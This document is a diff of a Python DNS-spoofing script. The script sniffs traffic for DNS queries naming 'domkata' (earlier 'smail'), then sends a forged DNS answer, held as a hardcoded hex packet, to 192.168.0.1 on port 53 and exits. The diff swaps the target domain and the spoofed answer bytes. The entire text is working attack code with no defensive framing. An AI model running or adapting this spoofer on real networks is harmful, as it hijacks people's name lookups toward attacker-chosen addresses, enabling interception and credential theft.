@@ -8,7 +8,7 @@ cap.sniff(packet_count=10)
 
 UDP_IP = "192.168.0.1"
 UDP_PORT = 53
-MESSAGE = "4fa28180000100020000000103777777086d79646f6d61696e03636f6d0000010001c00c00050001000002580002c010c0100001000100000258000441fef2b40000290200000000000000"
+MESSAGE = "64668180000100010000000107646f6d6b61746103636f6d0000010001c00c0001000100000e100004332686b20000290200000000000000"
 
 def fake_dns_response(id):
     print("UDP target IP:", UDP_IP)
@@ -19,11 +19,9 @@ def fake_dns_response(id):
     sock.sendto(bytes.fromhex(MESSAGE), (UDP_IP, UDP_PORT))
 
 
-def is_smail_dns_request(pkt):
-    # print(re.match(".*smail.*", str(pkt)))
-    # print(pkt)
-    return True
-    # return re.match(".*smail.*", str(pkt))
+def is_domkata_dns_request(pkt):
+    print(pkt)
+    return "domkata" in str(pkt)
 
 
 def get_transaction_id(pkt):
@@ -38,9 +36,9 @@ def is_localhost(pkt):
 
 
 def print_dns_info(pkt):
-    if is_smail_dns_request(pkt) and not is_localhost(pkt):
+    if is_domkata_dns_request(pkt) and not is_localhost(pkt):
         id = get_transaction_id(pkt)
         fake_dns_response(id)
-
+        exit(1)
 
 cap.apply_on_packets(print_dns_info, timeout=100)
